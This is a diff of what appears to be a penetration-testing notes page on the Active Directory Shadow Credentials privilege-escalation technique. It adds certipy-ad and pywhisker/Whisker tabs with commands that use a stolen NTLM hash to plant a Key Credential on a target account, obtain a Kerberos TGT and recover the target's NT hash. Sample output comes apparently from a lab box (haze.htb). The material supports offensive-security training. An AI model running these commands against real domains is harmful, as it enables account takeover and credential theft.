@@ -4,10 +4,10 @@ date: 2024-7-31
 tags: ["Shadow Credentials", "Pass-The-Cert", "AddkeyCredentialLink", "Active Directory", "Windows", "Whisker", "Pywhisker"]
 ---
 
-### Privesc #1: Shadow Credentials
+### Privesc #1: Shadow Credential (From Linux)
 
-{{< tab set1 tab1 >}}Linux{{< /tab >}}
-{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tab set1 tab1 >}}pywhisker{{< /tab >}}
+{{< tab set1 tab2 >}}certipy-ad{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 #### 0. Pre-Check \[Optional\]
@@ -66,7 +66,7 @@ pip3 install -I pyopenssl==24.0.0
 #### 2. Request a TGT Using the PFX
 
 ```console
-sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
+sudo ntpdate -s <DC_IP> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
 ```
 
 ```console {class="sample-code"}
@@ -110,6 +110,43 @@ Recovered NT Hash
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
+
+```console
+# NTLM
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'haze-it-backup$@haze.htb' -hashes '735c02c6b2dc54c3c8c6891f55279ebc' -account edward.martin -target DC01.haze.htb -dc-ip 10.129.232.50
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'edward.martin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '40c9b346-bbf0-34fa-f9f8-173872388668'
+[*] Adding Key Credential with device ID '40c9b346-bbf0-34fa-f9f8-173872388668' to the Key Credentials for 'edward.martin'
+[*] Successfully added Key Credential with device ID '40c9b346-bbf0-34fa-f9f8-173872388668' to the Key Credentials for 'edward.martin'
+[*] Authenticating as 'edward.martin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'edward.martin@haze.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'edward.martin.ccache'
+[*] Wrote credential cache to 'edward.martin.ccache'
+[*] Trying to retrieve NT hash for 'edward.martin'
+[*] Restoring the old Key Credentials for 'edward.martin'
+[*] Successfully restored the old Key Credentials for 'edward.martin'
+[*] NT hash for 'edward.martin': 09e0b3eeb2e7a6b0d419e9ff8f4d91af
+```
+
+{{< /tabcontent >}}
+
+### Privesc #1: Shadow Credential (From Windows)
+
+{{< tab set2 tab1 >}}whisker{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
 
 #### 0. Pre-Check \[optional\]
 
@@ -198,5 +235,6 @@ PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .
 ```
 
 <small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>
+
 
 {{< /tabcontent >}}
